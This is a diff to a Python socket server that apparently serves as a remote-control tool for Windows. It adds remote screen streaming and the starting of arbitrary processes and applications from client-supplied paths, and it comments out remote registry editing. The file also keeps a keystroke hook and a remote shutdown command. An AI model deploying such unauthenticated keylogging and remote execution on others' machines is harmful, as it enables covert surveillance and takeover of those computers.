@@ -6,6 +6,7 @@ from pynput import keyboard
 import subprocess
 from pynput import keyboard
 import winreg
+import subprocess
 
 import Utils.object_handler as oh
 import Utils.screen_stream as ss
@@ -103,6 +104,9 @@ def getListRunningWindows():
 def processRequest(request, conn):
     print(request)
     
+    if request[0] == 'screen stream':
+       ss.screen_stream(conn) 
+
     if request[0] == 'process':
         if request[1] == 'watch process':
             temp = getProcessRunning()
@@ -117,6 +121,8 @@ def processRequest(request, conn):
             except:
                 oh.send_obj(conn, ['error'])
             pass
+        if request[1] == 'start process':
+            subprocess.Popen([request[2]])
     
     if request[0] == 'application':
         if request[1] == 'watch application':
@@ -133,6 +139,8 @@ def processRequest(request, conn):
             except:
                 oh.send_obj(conn, ['error'])
             pass
+        if request[1] == 'start application':
+            temp = subprocess.Popen([request[2]])
 
     if request[0] == 'keystroke':
         if request[1] == 'hook':
@@ -153,73 +161,73 @@ def processRequest(request, conn):
             print(keyboardRecord)
             keyboardRecord = ''
     
-    if request[0] == 'registry':
-        if request[1] == 'send file':
-            try:
-                file = open('regFile.reg', 'w')
-                file.write(str(request[2]))
-                file.close()
-                temp = subprocess.call(['reg', 'import', 'regFile.reg'])
-            except:
-                print('run reg file error')
-        
-        if request[1] == 'Get value':
-            path = request[2]
-            path = path.split('\\', 1)
-            valueName = request[3]
-            try:
-                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
-                temp = winreg.QueryValueEx(key, valueName)
-                winreg.CloseKey(key)
-                oh.send_obj(conn, temp[0])
-            except:
-                oh.send_obj(conn, 'error')
-        
-        if request[1] == 'Set value':
-            path = request[2]
-            path = path.split('\\', 1)
-            valueName = request[3]
-            data = request[4]
-            dataType = request[5]
-            try:
-                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
-                temp = winreg.SetValueEx(key, valueName, 0, winregConst[dataType], data)
-                winreg.CloseKey(key)
-                oh.send_obj(conn, 'done')
-            except:
-                oh.send_obj(conn, 'error')
-            pass            
+    #if request[0] == 'registry':
+    #    if request[1] == 'send file':
+    #        try:
+    #            file = open('regFile.reg', 'w')
+    #            file.write(str(request[2]))
+    #            file.close()
+    #            temp = subprocess.call(['reg', 'import', 'regFile.reg'])
+    #        except:
+    #            print('run reg file error')
+    #    
+    #    if request[1] == 'Get value':
+    #        path = request[2]
+    #        path = path.split('\\', 1)
+    #        valueName = request[3]
+    #        try:
+    #            key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
+    #            temp = winreg.QueryValueEx(key, valueName)
+    #            winreg.CloseKey(key)
+    #            oh.send_obj(conn, temp[0])
+    #        except:
+    #            oh.send_obj(conn, 'error')
+    #    
+    #    if request[1] == 'Set value':
+    #        path = request[2]
+    #        path = path.split('\\', 1)
+    #        valueName = request[3]
+    #        data = request[4]
+    #        dataType = request[5]
+    #        try:
+    #            key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
+    #            temp = winreg.SetValueEx(key, valueName, 0, winregConst[dataType], data)
+    #            winreg.CloseKey(key)
+    #            oh.send_obj(conn, 'done')
+    #        except:
+    #            oh.send_obj(conn, 'error')
+    #        pass            
 
-        if request[1] == 'Delete value':
-            path = request[2]
-            path = path.split('\\', 1)
-            valueName = request[3]
-            try:
-                key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
-                temp = winreg.DeleteValue(key, valueName)
-                winreg.CloseKey(key)
-                oh.send_obj(conn, 'done')
-            except:
-                oh.send_obj(conn, 'error')
+    #    if request[1] == 'Delete value':
+    #        path = request[2]
+    #        path = path.split('\\', 1)
+    #        valueName = request[3]
+    #        try:
+    #            key = winreg.OpenKey(winregConst[path[0]], path[1], 0, winreg.KEY_ALL_ACCESS)
+    #            temp = winreg.DeleteValue(key, valueName)
+    #            winreg.CloseKey(key)
+    #            oh.send_obj(conn, 'done')
+    #        except:
+    #            oh.send_obj(conn, 'error')
 
-        if request[1] == 'Create key':
-            path = request[2]
-            path = path.split('\\', 1)
-            try:
-                key = winreg.CreateKey(winregConst[path[0]], path[1])
-                winreg.CloseKey(key)
-                oh.send_obj(conn, 'done')
-            except:
-                oh.send_obj(conn, 'error')
-        
-        if request[1] == 'Delete key':
-            path = request[2]
-            path = path.split('\\', 1)
-            try:
-                winreg.DeleteKey(winregConst[path[0]], path[1])
-                oh.send_obj(conn, 'done')
-            except:
-                oh.send_obj(conn, 'error')
+    #    if request[1] == 'Create key':
+    #        path = request[2]
+    #        path = path.split('\\', 1)
+    #        try:
+    #            key = winreg.CreateKey(winregConst[path[0]], path[1])
+    #            winreg.CloseKey(key)
+    #            oh.send_obj(conn, 'done')
+    #        except:
+    #            oh.send_obj(conn, 'error')
+    #    
+    #    if request[1] == 'Delete key':
+    #        path = request[2]
+    #        path = path.split('\\', 1)
+    #        try:
+    #            winreg.DeleteKey(winregConst[path[0]], path[1])
+    #            oh.send_obj(conn, 'done')
+    #        except:
+    #            oh.send_obj(conn, 'error')
     
     if request[0] == 'Shutdown':
         os.system('shutdown -s')
@@ -231,13 +239,12 @@ if __name__ == '__main__':
         while True:
             conn, addr = s.accept()
             with conn:
-                print('Connected by: ', addr)
-                ss.screen_stream(conn)
-                #while True:
-                #    request = conn.recv(1024) 
-                #    requets = oh.receive_obj(conn)
-                #    #if not request:
-                #     #  break
-                #    #print(request)
-                #    #processRequest(request, conn)
+                #print('Connected by: ', addr)
+                #ss.screen_stream(conn)
+                while True:
+                    print("ready new request")
+                    request = oh.receive_obj(conn)
+                    if request[0] == 'quit':
+                        break
+                    processRequest(request, conn)
                 conn.close
